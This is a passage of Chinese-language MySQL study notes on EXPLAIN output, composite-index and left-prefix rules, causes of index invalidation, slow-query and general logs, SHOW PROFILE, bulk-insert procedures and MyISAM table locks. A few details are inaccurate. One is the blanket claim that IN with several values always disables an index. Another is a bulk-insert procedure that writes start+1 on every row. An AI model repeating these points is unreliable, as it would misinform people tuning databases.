<p>2）Using temporary，使用了临时表保存中间结果，MySQL在查询时对查询结果使用了临时表，常见于order by和group by。例如：表中有复合索引<code>idx_col1_col2 (col1, col2)</code>，<code>SELECT col1 FROM t WHERE col1 IN (&#39;AA&#39;, &#39;BB&#39;) GROUP BY col2;</code>会产生临时表，可以优化为<code>GROUP BY col1,col2</code>；</p>
<p>3）Using index，使用了覆盖索引（Covering Index），说明数据列可以直接从索引中读取到，而不必读取数据行，可以直接从索引中返回数据列，而不需要从数据文件中读取数据，换句话说，查询列被索引覆盖；</p>
<p>4）Using where，使用了where过滤；</p>
<p>5）using join buffer，使用了连接缓存；</p>
<p>6）impossible where，where条件为false，不能用来获取任何元组；</p>
<p>7）select tables optimized away，在没有GROUP BY子句的情况下，基于索引优化MIN&#x2F;MAX操作或者对于MyISAM存储引擎优化COUNT(*)操作，不比等到执行阶段再进行计算，查询执行计划生成的阶段即完成优化；</p>
<p>8）distinct，distinct优化操作，在找到第一匹配的元组后即停止找同样值的操作；</p>
<h2 id="9-4-索引优化"><a href="#9-4-索引优化" class="headerlink" title="9.4 索引优化"></a>9.4 索引优化</h2><h3 id="9-4-1-单表"><a href="#9-4-1-单表" class="headerlink" title="9.4.1 单表"></a>9.4.1 单表</h3><p>假设有复合索引<code>idx_col1_col2_col3 (col1, col2, col3)</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t1 WHERE col1 = &#x27;xx&#x27; AND col2 &gt; n ORDER BY col3 DESC;		//Using filesort产生了文件内排序</span><br><span class="line"></span><br><span class="line">因此，删掉旧索引，重新建联合索引idx_col1_col3，跳过col2。</span><br></pre></td></tr></table></figure>

<h3 id="9-4-2-两表"><a href="#9-4-2-两表" class="headerlink" title="9.4.2 两表"></a>9.4.2 两表</h3><p>假设两表t1、t2，均包含列col：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t1 LEFT JOIN t2 ON t1.col = t2.col		//左连接建索引在右表对应的字段，因为左表肯定会查出所有</span><br><span class="line"></span><br><span class="line">SELECT * FROM t1 RIGHT JOIN t2 ON t1.col = t2.col		//右连接建索引在左表对应的字段，因为右表肯定会查出所有</span><br></pre></td></tr></table></figure>

<h3 id="9-4-3-多表"><a href="#9-4-3-多表" class="headerlink" title="9.4.3 多表"></a>9.4.3 多表</h3><p>和两表同理，多表连接查询，通常会用小表去连接大表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in性能优于exists: t1数据集大于t2</span><br><span class="line">SELECT * FROM t1 WHERE t1.aid IN (SELECT aid FROM t2)</span><br><span class="line"></span><br><span class="line">exists性能优于in: t1数据集小于t2</span><br><span class="line">SELECT * FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t1.aid = t2.aid)</span><br></pre></td></tr></table></figure>

<p>优化示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `t_dept` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `name` varchar(255) CHARACTER SET utf8mb4 NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE,</span><br><span class="line">  INDEX `idx_name_id`(`name`, `id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8mb4;</span><br><span class="line"></span><br><span class="line">CREATE TABLE `t_employee` (</span><br><span class="line">  `id` int(11) NOT NULL,</span><br><span class="line">  `username` varchar(255) CHARACTER SET utf8mb4 NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  `dept_id` int(11) NULL DEFAULT NULL,</span><br><span class="line">  `gender` tinyint(5) NOT NULL DEFAULT 0,</span><br><span class="line">  `class` varchar(255) CHARACTER SET utf8mb4 NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE,</span><br><span class="line">  INDEX `idx_class_gender`(`class`, `gender`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB CHARACTER SET = utf8mb4;</span><br><span class="line"></span><br><span class="line">INSERT INTO `t_dept` VALUES (1, &#x27;shichangbu&#x27;);</span><br><span class="line">INSERT INTO `t_dept` VALUES (2, &#x27;yanfabu&#x27;);</span><br><span class="line"></span><br><span class="line">INSERT INTO `t_employee` VALUES (1, &#x27;zs&#x27;, 2, 2, &#x27;a&#x27;);</span><br><span class="line">INSERT INTO `t_employee` VALUES (2, &#x27;lisi&#x27;, 1, 1, &#x27;b&#x27;);</span><br><span class="line">INSERT INTO `t_employee` VALUES (3, &#x27;wangwu&#x27;, 1, 1, &#x27;a&#x27;);</span><br><span class="line">INSERT INTO `t_employee` VALUES (4, &#x27;sss&#x27;, 2, 1, &#x27;a&#x27;);</span><br></pre></td></tr></table></figure>

<p>优化过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*优化EXPLAIN下面的那个查询语句*/</span><br><span class="line">EXPLAIN</span><br><span class="line">SELECT * FROM t_employee te LEFT JOIN t_dept td ON te.dept_id = td.id</span><br><span class="line">WHERE te.gender = 1 AND te.class = &#x27;a&#x27; AND td.name = &#x27;yanfabu&#x27; ORDER BY te.class,td.id</span><br><span class="line"></span><br><span class="line">/*分别给两张表建立索引，左连接记得在右表的连接字段建索引；因为排序用到class，因此class和gender的顺序要建对*/</span><br><span class="line">ALTER TABLE t_employee ADD INDEX `idx_class_gender` (`class`, `gender`);</span><br><span class="line">ALTER TABLE t_dept ADD INDEX `idx_name_id` (`name`, `id`);</span><br><span class="line"></span><br><span class="line">/*测试把name和id符合索引的位置交换，结果仍然产生文件内排序*/</span><br><span class="line">DROP INDEX `idx_name_id` ON t_dept;</span><br><span class="line">ALTER TABLE t_dept ADD INDEX `idx_id_name` (`id`, `name`);</span><br><span class="line">DROP INDEX `idx_id_name` ON t_dept;</span><br><span class="line">ALTER TABLE t_dept ADD INDEX `idx_name_id` (`name`, `id`);</span><br></pre></td></tr></table></figure>

<h3 id="9-4-4-索引失效原因"><a href="#9-4-4-索引失效原因" class="headerlink" title="9.4.4 索引失效原因"></a>9.4.4 索引失效原因</h3><p>1）不符合最佳左前缀法则导致索引失效</p>
<p>最佳左前缀法则：在复合索引中，最左边的索引列不能断，中间的列也不能断，如果在第n个断，则只会用到前n-1个列。</p>
<p>假设有复合索引<code>idx_col1_col2_col3 (col1, col2, col3)</code>：</p>
<table>
<thead>
<tr>
<th>条件</th>
<th>是否用到索引（Y&#x2F;N），以及索引列</th>
</tr>
</thead>
<tbody><tr>
<td>WHERE col1 &#x3D; 3</td>
<td>Y，索引列：col1</td>
</tr>
<tr>
<td>WHERE col1 &#x3D; 3 AND col2 &#x3D; 3</td>
<td>Y，索引列：col1、col2</td>
</tr>
<tr>
<td>WHERE col1 &#x3D; 3 AND col2 &#x3D; 3 AND col3 &#x3D; 3</td>
<td>Y，索引列：col1、col2、col3</td>
</tr>
<tr>
<td>WHERE col1 &#x3D; 3 AND col3 &#x3D; 3</td>
<td>Y，索引列：col1</td>
</tr>
<tr>
<td>WHERE col2 &#x3D; 3 AND col3 &#x3D; 3 或者 WHERE col2 &#x3D; 3 或者 WHERE col3 &#x3D; 3</td>
<td>N</td>
</tr>
<tr>
<td>WHERE col1 &#x3D; 3 AND col2 &gt; 3 AND col3 &#x3D; 3</td>
<td>Y，索引列：col1、col2，范围查询后导致后面的索引列失效</td>
</tr>
<tr>
<td>WHERE col1 &#x3D; 3 AND col2 LIKE ‘2%’ AND col3 &#x3D; 3</td>
<td>Y，索引列：col1、col2、col3</td>
</tr>
<tr>
<td>WHERE col1 &#x3D; 3 AND col2 LIKE ‘%2’ AND col3 &#x3D; 3</td>
<td>Y，索引列：col1</td>
</tr>
<tr>
<td>WHERE col1 &#x3D; 3 AND col2 LIKE ‘%2%’ AND col3 &#x3D; 3</td>
<td>Y，索引列：col1</td>
</tr>
<tr>
<td>WHERE col1 &#x3D; 3 AND col2 LIKE ‘6%2%’ AND col3 &#x3D; 3</td>
<td>Y，索引列：col1、col2、col3</td>
</tr>
</tbody></table>
<p>2）索引列上做计算、函数、类型转换（手动或者自动）均导致索引失效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t1 WHERE age + 1 = 3;		//索引列计算</span><br><span class="line"></span><br><span class="line">SELECT * FROM t1 WHERE LEFT(name, 4) = &#x27;Tony&#x27;;	//索引列使用函数</span><br><span class="line"></span><br><span class="line">SELECT * FROM t1 WHERE name = 123;		//123自动转为字符串</span><br><span class="line">SELECT * FROM t1 WHERE name = Tom;		//类型的自动转换为字符串类型</span><br></pre></td></tr></table></figure>

<p>3）复合索引中范围查询右边的索引列会失效</p>
<p>假设有复合索引<code>idx_col1_col2_col3 (col1, col2, col3)</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//只会使用到索引中col1和col2这两个列，col3失效。可调换索引中col2和col3两者的位置解决，注意不是调换SQL条件的位置。</span><br><span class="line">SELECT * FROM t1 WHERE col1 = &#x27;xx&#x27; AND col2 &gt; n AND col3 = &#x27;yy&#x27;;</span><br><span class="line"></span><br><span class="line">//三个索引列都生效。LIKE不以通配符开头的范围条件，不会导致索引失效。</span><br><span class="line">SELECT * FROM t1 WHERE col1 = &#x27;xx&#x27; AND col2 LIKE &#x27;2%&#x27; AND col3 = &#x27;yy&#x27;;</span><br></pre></td></tr></table></figure>

<p>4）使用不等于（!&#x3D;或&lt;&gt;）、IS NULL、IS NOT NULL均导致索引失效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t1 WHERE name != &#x27;xxx&#x27;;</span><br><span class="line">SELECT * FROM t1 WHERE name &lt;&gt; &#x27;xxx&#x27;;</span><br><span class="line"></span><br><span class="line">SELECT * FROM t1 WHERE name IS NULL;</span><br><span class="line">SELECT * FROM t1 WHERE name IS NOT NULL;</span><br></pre></td></tr></table></figure>

<p>5）以通配符开头（%或_）的模糊查询（LIKE）导致索引失效</p>
<p>可通过覆盖索引解决。覆盖索引：查询结果集的所有列，都包含在复合索引中，可以走覆盖索引，与字段顺序无关，不需要回表，从而极大地提高查询效率。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t1 WHERE name LIKE &#x27;%xxx&#x27;;</span><br><span class="line">SELECT * FROM t1 WHERE name LIKE &#x27;_xxx&#x27;;</span><br></pre></td></tr></table></figure>

<p>6）OR可能导致索引失效</p>
<p>可通过UNION联合结果集解决。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t1 WHERE name = &#x27;xx&#x27; OR age = 20;</span><br></pre></td></tr></table></figure>

<p>7）IN 多个值导致索引失效（超过1个就失效）</p>
<p>解决方法与OR一样。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t1 WHERE name IN (&#x27;xx&#x27;,&#x27;yy&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="9-5-慢查询分析"><a href="#9-5-慢查询分析" class="headerlink" title="9.5 慢查询分析"></a>9.5 慢查询分析</h2><ol>
<li>慢查询开启并捕获，例如：开启慢日志查询，跑1天，观察慢SQL，假定超过5s为慢SQL；</li>
<li>explain + 慢SQL分析；</li>
<li>show profile查询SQL在MySQL服务器里面的执行细节和生命周期情况；</li>
<li>DBA对数据库服务器的参数调优；</li>
</ol>
<p>开启慢查询日志（重启失效）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看是否开启了慢查询日志，默认关闭</span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%slow_query_log%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 开启慢查询日志，只对当前数据库生效，且数据库服务重启失效</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"># 查看几秒以上的算慢<span class="keyword">SQL</span></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%long_query_time%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 设置超过<span class="number">3</span>s的为慢<span class="keyword">SQL</span>，不包括<span class="number">3</span>s，修改后已经生效，需要在VARIABLES前加<span class="keyword">GLOBAL</span>，或者重新连接MYSQL，否则看到的是旧值</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> long_query_time<span class="operator">=</span><span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"># mysqldumpslow帮助信息：</span><br><span class="line"># s<span class="operator">-</span>以哪种方式排序；c<span class="operator">-</span>访问次数；l<span class="operator">-</span>锁定时间；r<span class="operator">-</span>返回记录；t<span class="operator">-</span>查询时间；al<span class="operator">-</span>平均锁定时间；</span><br><span class="line"># ar<span class="operator">-</span>平均返回记录数；<span class="keyword">at</span><span class="operator">-</span>平均查询时间；t<span class="operator">-</span>返回前面多少天记录；g<span class="operator">-</span>加正则，大小写不敏感；</span><br><span class="line"># 例如：</span><br><span class="line">mysqldumpslow <span class="operator">-</span>s r <span class="operator">-</span>t <span class="number">10</span> xxx.log	# 返回记录集最多的<span class="number">10</span>个<span class="keyword">SQL</span></span><br><span class="line">mysqldumpslow <span class="operator">-</span>s c <span class="operator">-</span>t <span class="number">10</span> xxx.log	# 访问次数最多的<span class="number">10</span>个<span class="keyword">SQL</span></span><br><span class="line">mysqldumpslow <span class="operator">-</span>s t <span class="operator">-</span>t <span class="number">10</span> <span class="operator">-</span>g &quot;left join&quot; xxx.log		# 按时间排序前<span class="number">10</span>条包含<span class="keyword">left</span> <span class="keyword">join</span>的<span class="keyword">SQL</span></span><br><span class="line">mysqldumpslow <span class="operator">-</span>s r <span class="operator">-</span>t <span class="number">10</span> xxx.log <span class="operator">|</span> more		# 结合管道命令使用</span><br></pre></td></tr></table></figure>

<p>永久性开启慢查询日志（修改配置my.cnf）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">slow_query_log=1</span><br><span class="line">slow_query_log_file=/var/lib/mysql/xxxhost-slow.log</span><br><span class="line">long_query_time=3</span><br><span class="line">log_output=FILE</span><br></pre></td></tr></table></figure>

<h2 id="9-6-ORDER-BY和GROUP-BY"><a href="#9-6-ORDER-BY和GROUP-BY" class="headerlink" title="9.6 ORDER BY和GROUP BY"></a>9.6 ORDER BY和GROUP BY</h2><h3 id="9-6-1-ORDER-BY"><a href="#9-6-1-ORDER-BY" class="headerlink" title="9.6.1 ORDER BY"></a>9.6.1 ORDER BY</h3><p>有两种：Using filesort&#x2F;Using index（优于filesort）</p>
<p>1）只有ORDER BY，需满足最佳左前缀法则，才不产生filesort</p>
<p>2）WHERE + ORDER BY组合使用，组合需满足最佳左前缀法则，才不产生filesort</p>
<p>3）因为ORDER BY默认ASC升序排序（全部升序或者降序可以使用索引，有升序也有降序不行），假如：ORDER BY id ASC, age DESC，导致Using filesort</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filesort有两种：</span><br><span class="line">1. 双路排序算法（mysql4.1前）：从磁盘读取需要排序的字段到缓冲区buffer，再进行排序，再读取，再排序，两次IO</span><br><span class="line">2. 单路排序算法（mysql4.1后）：从磁盘读取所有需要排序的字段到缓冲区buffer，再进行排序一次IO，但是如果缓冲区大小不够容纳所有排序的列，会创建临时文件tmp进行文件合并排序，则需要多次IO，性能可能不如双路，虽然两种算法都可能出现多次IO,但单路排序算法风险更高，所以需要适当调大sort_buffer_size、max_length_for_sort_data参数</span><br></pre></td></tr></table></figure>

<p>假设有KEY idx_abc(a,b,c)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不产生filesort:</span><br><span class="line">- ORDER BY a</span><br><span class="line">- ORDER BY a,b</span><br><span class="line">- ORDER BY a,b,c</span><br><span class="line">- ORDER BY a DESC, b DESC, c DESC</span><br><span class="line"></span><br><span class="line">结合where不产生filesort:</span><br><span class="line">- WHERE a = const ORDER BY b,c</span><br><span class="line">- WHERE a = const AND b = const ORDER BY c</span><br><span class="line">- WHERE a = const AND b &gt; const ORDER BY b,c</span><br><span class="line"></span><br><span class="line">产生filesort:</span><br><span class="line">- ORDER BY a ASC, b DESC, c DESC	//升降序混用</span><br><span class="line">- WHERE g = const ORDER BY b,c		//丢失a索引</span><br><span class="line">- WHERE a = const ORDER BY c		//丢失b索引</span><br><span class="line">- WHERE a = const ORDER BY a,d		//d不是索引的一部分</span><br><span class="line">- WHERE a IN (...) ORDER BY b,c		//对于排序来说，多个相等条件也是范围查询，注意是多指，也就是IN里面是多个值，如果是单个值的情况不会导致filesort</span><br></pre></td></tr></table></figure>

<h3 id="9-6-2-GROUP-BY"><a href="#9-6-2-GROUP-BY" class="headerlink" title="9.6.2 GROUP BY"></a>9.6.2 GROUP BY</h3><p>实际上是先排序后分组，遵循最左前缀法则，与ORDER BY类似，能写在WHERE的条件，就不要写在HAVING上了</p>
<h2 id="9-7-show-profile"><a href="#9-7-show-profile" class="headerlink" title="9.7 show profile"></a>9.7 show profile</h2><h3 id="9-7-1-批量插入千万数据脚本"><a href="#9-7-1-批量插入千万数据脚本" class="headerlink" title="9.7.1 批量插入千万数据脚本"></a>9.7.1 批量插入千万数据脚本</h3><h4 id="1）预先创建表"><a href="#1）预先创建表" class="headerlink" title="1）预先创建表"></a>1）预先创建表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用函数大量插入数据时，可能mysql报错（This function has none of DETEMINISTIC ...）：</span><br><span class="line"></span><br><span class="line">SHOW VARIABLES LIKE &#x27;log_bin_trust_function_creators&#x27;;</span><br><span class="line">SET GLOBAL log_bin_trust_function_creators=1;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE dept (</span><br><span class="line">id INT UNSIGNED PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">deptno MEDIUMINT UNSIGNED NOT NULL DEFAULT 0,</span><br><span class="line">dname VARCHAR(20) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">loc VARCHAR(13) NOT NULL DEFAULT &#x27;&#x27;</span><br><span class="line">) ENGINE=INNODB DEFAULT CHARSET=UTF8;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE emp (</span><br><span class="line">id INT UNSIGNED PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">empno MEDIUMINT UNSIGNED NOT NULL DEFAULT 0,</span><br><span class="line">ename VARCHAR(20) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">job VARCHAR(9) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">mgr MEDIUMINT UNSIGNED NOT NULL DEFAULT 0,</span><br><span class="line">hiredate DATE NOT NULL,</span><br><span class="line">sal DECIMAL(7,2) NOT NULL,</span><br><span class="line">comm DECIMAL(7,2) NOT NULL,</span><br><span class="line">deptno MEDIUMINT UNSIGNED NOT NULL DEFAULT 0</span><br><span class="line">) ENGINE=INNODB DEFAULT CHARSET=UTF8;</span><br></pre></td></tr></table></figure>

<h4 id="2）指定长度随机英文字符串（函数）"><a href="#2）指定长度随机英文字符串（函数）" class="headerlink" title="2）指定长度随机英文字符串（函数）"></a>2）指定长度随机英文字符串（函数）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELIMITER $$  #设置分割符为双美元符，mysql默认为分号</span><br><span class="line">CREATE FUNCTION rand_string(len INT(10)) RETURNS VARCHAR(100)		#函数有返回值，存储过程没返回值(RETURNS)</span><br><span class="line">BEGIN		#开启函数体</span><br><span class="line">DECLARE str VARCHAR(100) DEFAULT &#x27;&#x27;;</span><br><span class="line">DECLARE i INT(10) DEFAULT 0;</span><br><span class="line">DECLARE res VARCHAR(100) DEFAULT &#x27;&#x27;;</span><br><span class="line">SET str = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">WHILE i &lt; len DO	#开启WHILE</span><br><span class="line">	SET res = CONCAT(res, SUBSTRING(str,CEIL(RAND()*LENGTH(str)), 1));</span><br><span class="line">	SET i = i + 1;</span><br><span class="line">	END WHILE;		#结束WHILE</span><br><span class="line">RETURN res;</span><br><span class="line">END $$		#结束函数体</span><br><span class="line">DELIMITER ;  #把分割符重设为分号</span><br></pre></td></tr></table></figure>

<h4 id="3）产生一个100-110的数字（函数）"><a href="#3）产生一个100-110的数字（函数）" class="headerlink" title="3）产生一个100~110的数字（函数）"></a>3）产生一个100~110的数字（函数）</h4><p>这里作为部门编号使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line">CREATE FUNCTION rand_num() RETURNS INT(3)</span><br><span class="line">BEGIN</span><br><span class="line">DECLARE num INT(3) DEFAULT 100;</span><br><span class="line">SET num = num + CEIL(RAND()*10);</span><br><span class="line">RETURN num;</span><br><span class="line">END $$</span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<h4 id="4）批量插入数据（存储过程）"><a href="#4）批量插入数据（存储过程）" class="headerlink" title="4）批量插入数据（存储过程）"></a>4）批量插入数据（存储过程）</h4><p>员工表：这里可以每次插入50w条，执行20次插入1000w条</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line">CREATE PROCEDURE insert_emp(IN start INT(10), IN max_num INT(10))</span><br><span class="line">BEGIN</span><br><span class="line">DECLARE i INT(10) DEFAULT 0;</span><br><span class="line">SET autocommit = 0;		#需要在DECLARE后</span><br><span class="line">REPEAT</span><br><span class="line">SET i = i + 1;</span><br><span class="line">INSERT INTO emp(empno, ename, job, mgr, hiredate, sal, comm, deptno) VALUES ((start+1), rand_string(6), &#x27;IRONMAN&#x27;, 0001, CURDATE(), 2000, 400, rand_num());</span><br><span class="line">UNTIL i = max_num</span><br><span class="line">END REPEAT;</span><br><span class="line">COMMIT;</span><br><span class="line">END $$</span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<p>部门表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line">CREATE PROCEDURE insert_dept(IN start INT(10), IN max_num INT(10))</span><br><span class="line">BEGIN</span><br><span class="line">DECLARE i INT(10) DEFAULT 0;</span><br><span class="line">SET autocommit = 0;		#需要在DECLARE后</span><br><span class="line">REPEAT</span><br><span class="line">SET i = i + 1;</span><br><span class="line">INSERT INTO dept (deptno, dname, loc) VALUES((start+i), rand_string(10), rand_string(8));</span><br><span class="line">UNTIL i = max_num</span><br><span class="line">END REPEAT;</span><br><span class="line">COMMIT;</span><br><span class="line">END $$</span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<h4 id="5）调用定义的存储过程"><a href="#5）调用定义的存储过程" class="headerlink" title="5）调用定义的存储过程"></a>5）调用定义的存储过程</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL insert_dept(100,10);		//插入10个部门</span><br><span class="line">CALL insert_emp(100001, 500000);	//插入50w个员工</span><br></pre></td></tr></table></figure>

<h3 id="9-7-2-具体分析"><a href="#9-7-2-具体分析" class="headerlink" title="9.7.2 具体分析"></a>9.7.2 具体分析</h3><h4 id="1）查询是否关闭（默认）"><a href="#1）查询是否关闭（默认）" class="headerlink" title="1）查询是否关闭（默认）"></a>1）查询是否关闭（默认）</h4><p>SHOW VARIABLES LIKE ‘profiling’;</p>
<p>SET profiling&#x3D;on;	&#x2F;&#x2F;开启</p>
<h4 id="2）具体查看"><a href="#2）具体查看" class="headerlink" title="2）具体查看"></a>2）具体查看</h4><p>show profiles;		&#x2F;&#x2F;查看</p>
<p>show profile cpu,block io for query (show profiles的Query_ID);</p>
<table>
<thead>
<tr>
<th align="left">可选参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ALL</td>
<td>显示所有开销信息</td>
</tr>
<tr>
<td align="left">BLOCK IO</td>
<td>显示块IO相关开销信息</td>
</tr>
<tr>
<td align="left">CONTEXT SWITCHES</td>
<td>显示上下文切换相关开销信息</td>
</tr>
<tr>
<td align="left">CPU</td>
<td>显示cpu相关开销信息</td>
</tr>
<tr>
<td align="left">IPC</td>
<td>显示发送和接收相关开销信息</td>
</tr>
<tr>
<td align="left">MEMORY</td>
<td>显示内存相关开销信息</td>
</tr>
<tr>
<td align="left">PAGE FAULTS</td>
<td>显示页面错误相关开销信息</td>
</tr>
<tr>
<td align="left">SOURCE</td>
<td>显示和Source_function,Source_file,Source_line相关的开销信息</td>
</tr>
<tr>
<td align="left">SWAPS</td>
<td>显示交换次数相关开销信息</td>
</tr>
</tbody></table>
<h4 id="3）关键结果分析"><a href="#3）关键结果分析" class="headerlink" title="3）关键结果分析"></a>3）关键结果分析</h4><table>
<thead>
<tr>
<th>描述</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>converting HEAP to MyISAM</td>
<td>查询结果太大，内存不够用，往磁盘上存储数据了</td>
</tr>
<tr>
<td>Creating tmp table</td>
<td>创建临时表》拷贝数据到临时表》用完临时表再删除</td>
</tr>
<tr>
<td>Copying to tmp table on disk</td>
<td>把内存中的临时表复制到磁盘（危险）</td>
</tr>
<tr>
<td>locked</td>
<td></td>
</tr>
</tbody></table>
<h2 id="9-8-全局查询日志"><a href="#9-8-全局查询日志" class="headerlink" title="9.8 全局查询日志"></a>9.8 全局查询日志</h2><p>开启全局查询日志后，编写的SQL都被记录到<code>mysql.general_log</code>表，禁止在生产环境使用全局查询日志。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 配置开启（my.cnf）:</span><br><span class="line">general_log=1</span><br><span class="line">general_log_file=/path/logfile</span><br><span class="line">log_output=FILE</span><br><span class="line"></span><br><span class="line"># 或者使用命令开启</span><br><span class="line">set global general_log=1;</span><br><span class="line">set global log_output=&#x27;TABLE&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="9-9-MySQL锁"><a href="#9-9-MySQL锁" class="headerlink" title="9.9 MySQL锁"></a>9.9 MySQL锁</h2><p>按照不同的划分标准可分为：表锁、行锁、页锁；记录锁、间隙锁、临键锁</p>
<h3 id="9-9-1-表锁"><a href="#9-9-1-表锁" class="headerlink" title="9.9.1 表锁"></a>9.9.1 表锁</h3><ul>
<li>相关SQL</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW OPEN TABLES;	//查看表是否被锁</span><br><span class="line">LOCK TABLE t_abc READ,t_xx WRITE;	//给t_abc表加读锁，t_xx加写锁</span><br><span class="line">UNLOCK TABLES;		//释放表</span><br></pre></td></tr></table></figure>

<ul>
<li>读锁（共享锁）、写锁（排它锁）</li>
</ul>
<p>使用MyISAM存储引擎的前提，session1和session2分别测试，在session1中加读锁的情况；session3和session4分别测试，在session3加写锁的情况：</p>
<table>
<thead>
<tr>
<th></th>
<th>session1，给t_abc加读锁</th>
<th>session2</th>
<th>session3，给t_abc加写锁</th>
<th>session4</th>
</tr>
</thead>
<tbody><tr>
<td>SELECT * FROM t_abc;（被锁定的表读操作）</td>
<td>可以查看加了读锁的表记录</td>
<td>可以查看加了读锁的表记录</td>
<td>可以查看加了写锁的表记录</td>
<td>阻塞，等待加了写锁的释放锁</td>
</tr>
<tr>
<td>UPDATE t_abc SET age &#x3D; 7 WHERE id &#x3D; 2;（被锁定的表写操作）</td>
<td>1099 - Table ‘t_abc’ was locked with a READ lock and can’t be updated</td>
<td>阻塞，等待加了读锁的释放锁</td>
<td>可以对加了写锁的表进行写操作</td>
<td>阻塞，等待加了写锁的释放锁</td>
</tr>
<tr>
<td>SELECT * FROM t_test;（其它表读操作）</td>
<td>1100 - Table ‘t_test’ was not locked with LOCK TABLES</td>
<td>不影响</td>
<td>1100 - Table ‘t_test’ was not locked with LOCK TABLES</td>
<td>不影响</td>
</tr>
<tr>
<td>UPDATE t_test SET b &#x3D; 7 WHERE id &#x3D; 2;（其它表写操作）</td>
<td>1100 - Table ‘t_test’ was not locked with LOCK TABLES</td>
<td>不影响</td>
<td>1100 - Table ‘t_test’ was not locked with LOCK TABLES</td>
<td>不影响</td>
</tr>
</tbody></table>
<p>结论：</p>
<p>①使用MyISAM存储引擎前提，在一个session中给表加读锁，在该session中，只能对该表进行读操作，不能对该表进行写操作，也不能对其它表进行读写操作；在其他session中，只能对该表进行读操作，写操作出阻塞，直到该表被释放，对其它表的读写操作不影响。（加了读锁，不会阻塞其它进程对该表的读操作，但会阻塞写操作，直到锁被释放）</p>
<p>②使用MyISAM存储引擎前提，在一个session中给表加写锁，在该session中，可以对该表进行读写操作，不能对其它表进行读写操作；在其他session中，对该表读写操作均阻塞，对其它表的读写操作不影响。（加了写锁，会阻塞其它进程对该表的读写操作，直到锁被释放）</p>
<ul>
<li>表锁定分析</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show status like &#x27;table%&#x27;;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>结果字段</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Table_locks_immediate</td>
<td>产生表锁的次数，表示可以立即获取锁的查询次数，每立即获取锁值加1</td>
</tr>
<tr>
<td>Table_locks_waited</td>
<td>出现表锁的而发生等待的次数（不能立即获取锁，每等待一次加1），此值高则说明存在较严重的锁竞争情况</td>
</tr>
</tbody></table>
<p>另外，MyISAM的读写锁调度是写优先，所以不适合做写为主的表的引擎。因为写锁后，其它进程不能对该表进行任何读写操作，大量的更新、查询被阻塞。</p>
